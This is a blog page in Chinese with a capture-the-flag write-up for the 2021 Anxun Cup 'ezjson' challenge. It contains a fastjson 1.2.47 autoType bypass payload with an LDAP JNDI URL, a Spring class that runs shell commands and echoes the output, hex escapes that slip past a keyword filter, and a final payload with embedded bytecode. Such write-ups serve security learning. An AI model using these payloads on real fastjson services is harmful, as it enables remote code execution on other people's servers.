@@ -1,0 +1,581 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  <link rel="icon" href="images/favicon.ico">
+  <title>2021安洵杯ezjson-wp | fmyyy</title>
+  <meta name="author" content="fmyyy" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="" />
+  
+  <meta name="description" content="ezjson比赛只做了前两道web，这道题没去看了，因为当时看做出来的人不多就去复习了，今天有空看一下题。 fd文件可以泄露 jar文件下到源码。题目环境不出网没法jndi。但题目本身留了加载字节码后门。   fastjson版本1.2.47,有个通杀payload 1234567891011&amp;#123;    &quot;a&quot;:&amp;#123;        &quot;@type&amp;quo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2021安洵杯ezjson-wp">
+<meta property="og:url" content="https://fmyyy.gitee.io/2021/12/02/2021%E5%AE%89%E6%B4%B5%E6%9D%AFezjson-wp/index.html">
+<meta property="og:site_name" content="fmyyy">
+<meta property="og:description" content="ezjson比赛只做了前两道web，这道题没去看了，因为当时看做出来的人不多就去复习了，今天有空看一下题。 fd文件可以泄露 jar文件下到源码。题目环境不出网没法jndi。但题目本身留了加载字节码后门。   fastjson版本1.2.47,有个通杀payload 1234567891011&amp;#123;    &quot;a&quot;:&amp;#123;        &quot;@type&amp;quo">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fmyyy.gitee.io/images/favicon.ico">
+<meta property="article:published_time" content="2021-12-02T01:14:04.000Z">
+<meta property="article:modified_time" content="2021-12-02T04:35:58.119Z">
+<meta property="article:author" content="fmyyy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fmyyy.gitee.io/images/favicon.ico">
+<meta name="twitter:site" content="@null">
+  
+  <!-- 站点验证相关 -->
+  
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" type="text/css" media="all">
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" type="text/css" media="all">
+  
+  
+  <link rel="stylesheet" id="fontawe-css" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" type="text/css" media="all">
+  <link rel="stylesheet" id="nprogress-css" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" type="text/css" media="all">
+  
+  
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-dark.min.css" type="text/css" media="all">
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+  
+  <style>
+    
+      .kratos-cover.kratos-cover-2 {
+        background-image: url('/images/hf1.jpg');
+      }
+    
+    
+      @media(min-width:768px) {
+        body.custom-background {
+          background-image: url('/images/bg.webp');
+        }
+      }
+    
+  </style>
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    
+                                        <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
+                                    
+                                
+                                    
+                                        <li><a href="/archives/"><i class="fa fa-file"></i>归档</a></li>
+                                    
+                                
+                                    
+                                        <li><a href="/friends/"><i class="fa fa-paw"></i>Friends</a></li>
+                                    
+                                
+                                    
+                                        <li>
+                                            <a><i class="fa fa-link"></i>链接</a>
+                                            <ul class="sub-menu">
+                                                
+                                                    
+                                                
+                                                    
+                                                        <li><a target="_blank" rel="noopener" href="https://blog.csdn.net/fmyyy1">CSDN</a></li>
+                                                    
+                                                
+                                            </ul>
+                                        </li>
+                                    
+                                
+                                    
+                                        <li>
+                                            <a><i class="fa fa-link"></i>联系</a>
+                                            <ul class="sub-menu">
+                                                
+                                                    
+                                                
+                                                    
+                                                        <li><a href="/null">QQ:254005846</a></li>
+                                                    
+                                                
+                                            </ul>
+                                        </li>
+                                    
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">fmyyy</a></div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>fmyyy</h2> <br />
+                        <span></span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        
+
+            <section class="col-md-8">
+
+        
+
+            <article>
+    <div class="kratos-hentry kratos-post-inner clearfix">
+        <header class="kratos-entry-header">
+            
+                <h1 class="kratos-entry-title text-center">2021安洵杯ezjson-wp</h1>
+            
+            
+            <ul class="kratos-post-meta text-center">
+                <li><i class="fa fa-calendar"></i> 2021-12-02</li>
+                <li><i class="fa fa-user"></i> 作者 fmyyy</li>
+                <li>
+                    <i class="fa fa-edit"></i> 
+                    
+                    
+                        ~12.79K
+                    
+                    字
+                </li>
+                
+            </ul>
+        </header>
+        <div class="kratos-post-content">
+            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
+                本文最后编辑于 <time datetime="1638419758119"></time> 前，其中的内容可能需要更新。
+            </div>
+            
+                <div class="kratos-post-inner-toc">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ezjson"><span class="toc-number">1.</span> <span class="toc-text">ezjson</span></a></li></ol>
+                </div>
+            
+            <hr />
+            <h2 id="ezjson"><a href="#ezjson" class="headerlink" title="ezjson"></a>ezjson</h2><p>比赛只做了前两道web，这道题没去看了，因为当时看做出来的人不多就去复习了，今天有空看一下题。</p>
+<p>fd文件可以泄露 jar文件下到源码。题目环境不出网没法jndi。但题目本身留了加载字节码后门。</p>
+<p><img src="http://img.le1a.com/2021/12/02/ed557a09900f0.png" alt="1638412580898.png"></p>
+<p><img src="http://img.le1a.com/2021/12/02/a9b6fe440a3e5.png" alt="1638415811131.png"></p>
+<p>fastjson版本1.2.47,有个通杀payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/badNameClass&quot;</span>,</span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>:<span class="keyword">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里调用到App.Exec的getFlag即可，</p>
+<p>这里可以用$ref调用任意的get</p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1613/#ref">https://paper.seebug.org/1613/#ref</a></p>
+<p>为了回显，字节码用老熟人spring通用回显</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> echo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.ResponseFacade;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterChain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpringEcho</span>  </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Exec</span><span class="params">(String cmd)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class c = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>);</span><br><span class="line">            Method m = c.getMethod(<span class="string">&quot;getRequestAttributes&quot;</span>);</span><br><span class="line">            Object o = m.invoke(<span class="keyword">null</span>);</span><br><span class="line">            c = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;org.springframework.web.context.request.ServletRequestAttributes&quot;</span>);</span><br><span class="line">            m = c.getMethod(<span class="string">&quot;getResponse&quot;</span>);</span><br><span class="line">            Method m1 = c.getMethod(<span class="string">&quot;getRequest&quot;</span>);</span><br><span class="line">            Object resp = m.invoke(o);</span><br><span class="line">            Object req = m1.invoke(o); <span class="comment">// HttpServletRequest</span></span><br><span class="line">            Method getWriter = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;javax.servlet.ServletResponse&quot;</span>).getDeclaredMethod(<span class="string">&quot;getWriter&quot;</span>);</span><br><span class="line">            Method getHeader = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span>).getDeclaredMethod(<span class="string">&quot;getHeader&quot;</span>, String.class);</span><br><span class="line">            getHeader.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            getWriter.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Object writer = getWriter.invoke(resp);</span><br><span class="line"></span><br><span class="line">            String[] commands = <span class="keyword">new</span> String[<span class="number">3</span>];</span><br><span class="line">            String charsetName = System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;window&quot;</span>) ? <span class="string">&quot;GBK&quot;</span> : <span class="string">&quot;UTF-8&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toUpperCase().contains(<span class="string">&quot;WIN&quot;</span>)) &#123;</span><br><span class="line">                commands[<span class="number">0</span>] = <span class="string">&quot;cmd&quot;</span>;</span><br><span class="line">                commands[<span class="number">1</span>] = <span class="string">&quot;/c&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                commands[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">                commands[<span class="number">1</span>] = <span class="string">&quot;-c&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            commands[<span class="number">2</span>] = cmd;</span><br><span class="line">            writer.getClass().getDeclaredMethod(<span class="string">&quot;println&quot;</span>, String.class).invoke(writer, <span class="keyword">new</span> Scanner(Runtime.getRuntime().exec(commands).getInputStream(), charsetName).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next());</span><br><span class="line">            writer.getClass().getDeclaredMethod(<span class="string">&quot;flush&quot;</span>).invoke(writer);</span><br><span class="line">            writer.getClass().getDeclaredMethod(<span class="string">&quot;close&quot;</span>).invoke(writer);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里还要绕关键字</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> BOOT-INF.classes.App;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JsonController</span> </span>&#123;</span><br><span class="line">  <span class="meta">@ResponseBody</span></span><br><span class="line">  <span class="meta">@RequestMapping(&#123;&quot;/json&quot;&#125;)</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> </span>&#123;</span><br><span class="line">    String Poc = request.getParameter(<span class="string">&quot;Poc&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (Poc != <span class="keyword">null</span>) &#123;</span><br><span class="line">      String pattern = <span class="string">&quot;.*Exec.*|.*cmd.*&quot;</span>;</span><br><span class="line">      <span class="keyword">boolean</span> isMatch = Pattern.matches(pattern, Poc);</span><br><span class="line">      <span class="keyword">if</span> (isMatch)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No way!!!&quot;</span>; </span><br><span class="line">      JSON.parse(Poc);</span><br><span class="line">      <span class="keyword">return</span> Poc;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;readme&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>fastjson有个特性，遇到\x和\u就会解码，所以十六进制绕过</p>
+<p>exp</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> anxun;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Locale;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">static</span>  String <span class="title">bytesToHexString</span><span class="params">(<span class="keyword">byte</span>[] src)</span></span>&#123;</span><br><span class="line">        StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (src == <span class="keyword">null</span> || src.length &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; src.length; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> v = src[i] &amp; <span class="number">0xFF</span>;</span><br><span class="line">            String hv = Integer.toHexString(v);</span><br><span class="line">            <span class="keyword">if</span> (hv.length() &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                stringBuilder.append(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            stringBuilder.append(hv);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stringBuilder.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"><span class="comment">//        byte[] bytes = ClassPool.getDefault().get(&quot;echo.payload&quot;).toBytecode();</span></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = ClassPool.getDefault().get(<span class="string">&quot;echo.SpringEcho&quot;</span>).toBytecode();</span><br><span class="line">        String code = bytesToHexString(bytes).toUpperCase(Locale.ROOT);</span><br><span class="line">        System.out.println(<span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;a\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.Class\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;val\&quot;:\&quot;App.\\x45\\x78\\x65\\x63\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;b\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;:\&quot;App.\\x45\\x78\\x65\\x63\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;ClassByte\&quot;:x\&#x27;&quot;</span>+code+<span class="string">&quot;\&#x27;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;\\x63\\x6d\\x64\&quot;: \&quot;ls\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;flag\&quot;: &#123;\&quot;$ref\&quot;:\&quot;$.b.flag\&quot;&#125;\n&quot;</span>+</span><br><span class="line">                <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Poc=&#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="string">&quot;val&quot;</span>:<span class="string">&quot;App.\x45\x78\x65\x63&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;b&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;App.\x45\x78\x65\x63&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ClassByte&quot;</span>:x<span class="string">&#x27;CAFEBABE0000003400AC0A000900540A005500560A005500570800580A0059005A08005B07005C0A0007005D07005E0A005F00600800610800620800630800640800420A000700650800660800430700670A005F00680800690A006A006B0A0013006C08006D0A0013006E08006F0800700A001300710800720800490800730800740800750A000900760800770700780A0079007A0A0079007B0A007C007D0A0024007E08007F0A002400800A002400810800820800830700840700850100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C65010004746869730100114C6563686F2F537072696E674563686F3B01000445786563010015284C6A6176612F6C616E672F537472696E673B2956010001630100114C6A6176612F6C616E672F436C6173733B0100016D01001A4C6A6176612F6C616E672F7265666C6563742F4D6574686F643B0100016F0100124C6A6176612F6C616E672F4F626A6563743B0100026D3101000472657370010003726571010009676574577269746572010009676574486561646572010006777269746572010008636F6D6D616E64730100135B4C6A6176612F6C616E672F537472696E673B01000B636861727365744E616D650100124C6A6176612F6C616E672F537472696E673B010003636D6401000D537461636B4D61705461626C6507006707005C07008607005E0700460700840100104D6574686F64506172616D657465727301000A536F7572636546696C6501000F537072696E674563686F2E6A6176610C003000310700870C008800890C008A008B01003C6F72672E737072696E676672616D65776F726B2E7765622E636F6E746578742E726571756573742E52657175657374436F6E74657874486F6C64657207008C0C008D008E010014676574526571756573744174747269627574657301000F6A6176612F6C616E672F436C6173730C008F00900100106A6176612F6C616E672F4F626A6563740700860C009100920100406F72672E737072696E676672616D65776F726B2E7765622E636F6E746578742E726571756573742E536572766C6574526571756573744174747269627574657301000B676574526573706F6E736501000A6765745265717565737401001D6A617661782E736572766C65742E536572766C6574526573706F6E73650C009300900100256A617661782E736572766C65742E687474702E48747470536572766C6574526571756573740100106A6176612F6C616E672F537472696E670C009400950100076F732E6E616D650700960C009700980C0099009A01000677696E646F770C009B009C01000347424B0100055554462D380C009D009A01000357494E0100022F630100072F62696E2F73680100022D630C009E009F0100077072696E746C6E0100116A6176612F7574696C2F5363616E6E65720700A00C00A100A20C00A300A40700A50C00A600A70C003000A80100025C410C00A900AA0C00AB009A010005666C757368010005636C6F73650100136A6176612F6C616E672F457863657074696F6E01000F6563686F2F537072696E674563686F0100186A6176612F6C616E672F7265666C6563742F4D6574686F640100106A6176612F6C616E672F54687265616401000D63757272656E7454687265616401001428294C6A6176612F6C616E672F5468726561643B010015676574436F6E74657874436C6173734C6F6164657201001928294C6A6176612F6C616E672F436C6173734C6F616465723B0100156A6176612F6C616E672F436C6173734C6F616465720100096C6F6164436C617373010025284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F436C6173733B0100096765744D6574686F64010040284C6A6176612F6C616E672F537472696E673B5B4C6A6176612F6C616E672F436C6173733B294C6A6176612F6C616E672F7265666C6563742F4D6574686F643B010006696E766F6B65010039284C6A6176612F6C616E672F4F626A6563743B5B4C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0100116765744465636C617265644D6574686F6401000D73657441636365737369626C65010004285A29560100106A6176612F6C616E672F53797374656D01000B67657450726F7065727479010026284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F537472696E673B01000B746F4C6F7765724361736501001428294C6A6176612F6C616E672F537472696E673B010008636F6E7461696E7301001B284C6A6176612F6C616E672F4368617253657175656E63653B295A01000B746F557070657243617365010008676574436C61737301001328294C6A6176612F6C616E672F436C6173733B0100116A6176612F6C616E672F52756E74696D6501000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B01000465786563010028285B4C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0100116A6176612F6C616E672F50726F6365737301000E676574496E70757453747265616D01001728294C6A6176612F696F2F496E70757453747265616D3B01002A284C6A6176612F696F2F496E70757453747265616D3B4C6A6176612F6C616E672F537472696E673B295601000C75736544656C696D69746572010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F7574696C2F5363616E6E65723B0100046E6578740021002F0009000000000002000100300031000100320000002F00010001000000052AB70001B10000000200330000000600010000001500340000000C00010000000500350036000000090037003800020032000002B60009000C00000165B80002B600031204B600054C2B120603BD0007B600084D2C0103BD0009B6000A4EB80002B60003120BB600054C2B120C03BD0007B600084D2B120D03BD0007B600083A042C2D03BD0009B6000A3A0519042D03BD0009B6000A3A06B80002B60003120EB60005120F03BD0007B600103A07B80002B600031211B60005121204BD00075903121353B600103A08190804B60014190704B600141907190503BD0009B6000A3A0906BD00133A0A1215B80016B600171218B60019990008121AA70005121B3A0B1215B80016B6001C121DB60019990012190A03121E53190A04121F53A7000F190A03122053190A04122153190A052A531909B60022122304BD00075903121353B60010190904BD00095903BB002459B80025190AB60026B60027190BB700281229B6002AB6002B53B6000A571909B60022122C03BD0007B60010190903BD0009B6000A571909B60022122D03BD0007B60010190903BD0009B6000A57A700044CB10001000001600163002E000300330000006E001B00000018000C00190017001A0021001B002D001C0038001D0044001E004F001F005B002000710021008C0022009200230098002400A5002600AB002700C4002800D4002900DA002A00E3002C00E9002D00EF002F00F40030013000310148003201600036016300340164003800340000007A000C000C01540039003A000100170149003B003C00020021013F003D003E00030044011C003F003C0004004F01110040003E0005005B01050041003E0006007100EF0042003C0007008C00D40043003C000800A500BB0044003E000900AB00B500450046000A00C4009C00470048000B00000165004900480000004A000000430006FF00C0000B07004B07004C07004D07004E07004D07004E07004E07004D07004D07004E07004F00004107004BFC002007004B0BFF0073000107004B000107005000005100000005010049000000010052000000020053&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;\x63\x6d\x64&quot;</span>: <span class="string">&quot;ls /&quot;</span>,</span><br><span class="line">        <span class="string">&quot;flag&quot;</span>: &#123;<span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.b.flag&quot;</span>&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="http://img.le1a.com/2021/12/02/0b6ce113a60d0.png" alt="1638418846329.png"></p>
+<p>s</p>
+
+        </div>
+        
+            <div class="kratos-copyright text-center clearfix">
+                <h5>本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
+            </div>
+        
+        <footer class="kratos-entry-footer clearfix">
+            
+                <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                
+                
+                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
+                    <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
